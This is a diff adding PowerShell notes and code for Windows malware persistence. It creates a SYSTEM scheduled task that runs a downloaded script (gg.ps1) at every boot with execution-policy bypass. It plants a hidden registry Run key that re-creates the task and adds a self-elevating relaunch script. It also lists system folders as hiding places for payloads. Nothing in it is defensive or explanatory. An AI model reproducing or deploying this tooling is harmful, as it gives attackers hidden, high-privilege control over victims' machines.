@@ -1,1 +1,38 @@
+# Create task scheduler Value
 schtasks /create /tn "CheckRegistryAtStartup" /tr "powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1" /sc onstart /ru SYSTEM /rl HIGHEST /f
+
+# Set Registry Value
+$command = "powershell.exe -w hidden -noP -c 'Start-Sleep -Seconds 10;schtasks /create /tn CheckRegistryAtStartup /tr ''powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1'' /sc onstart /ru SYSTEM /rl HIGHEST /f'"
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "CheckRegistryAtStartup" -Value $command
+
+
+# Auto-Elevate.ps1 Code
+# This script will be placed in one of the path as this one is important for monitoring the task scheduler
+(take consideration of these Paths to store payloads)
+* C:\Windows\system32\config\systemprofile\AppData\Local  
+* C:\Windows\System32
+* C:\Windows\System32\GroupPolicy\User\Scripts\logon 
+* C:\Recovery
+
+### BEGIN
+# Path to the script to be executed
+$scriptPath = "$env:USERPROFILE\Downloads\gg.ps1"                                   
+
+# Check if the script is running with elevated privileges (admin rights, for now)
+$isElevated = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'
+
+if (-not $isElevated) {
+    # Relaunch the script with elevated privileges with prompts (for now)
+    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    exit
+}
+
+# Code to create the scheduled task if needed
+$taskName = "CheckRegistryAtStartup"
+$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+
+if (-not $taskExists) {
+    # If the task doesn't exist, create it
+    schtasks /create /tn $taskName /tr "powershell.exe -NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onstart /ru SYSTEM /rl HIGHEST /f
+}
+### END
